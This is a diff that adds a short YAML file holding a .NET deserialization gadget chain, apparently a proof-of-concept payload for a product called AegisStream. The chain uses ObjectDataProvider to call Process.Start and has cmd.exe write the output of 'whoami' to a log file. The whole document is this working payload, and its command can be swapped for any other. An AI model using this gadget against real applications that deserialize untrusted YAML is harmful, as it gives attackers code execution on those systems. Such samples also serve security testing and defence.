@@ -1,0 +1,11 @@
+!<!System.Windows.Data.ObjectDataProvider,PresentationFramework> {
+  MethodName: Start,
+  ObjectInstance:
+    !<!System.Diagnostics.Process,System.Diagnostics.Process> {
+      StartInfo:
+        !<!System.Diagnostics.ProcessStartInfo,System.Diagnostics.Process> {
+          FileName: cmd.exe,
+          Arguments: "/c whoami > C:\\ProgramData\\AegisStream\\logs\\yaml-proof.txt"
+        }
+    }
+}
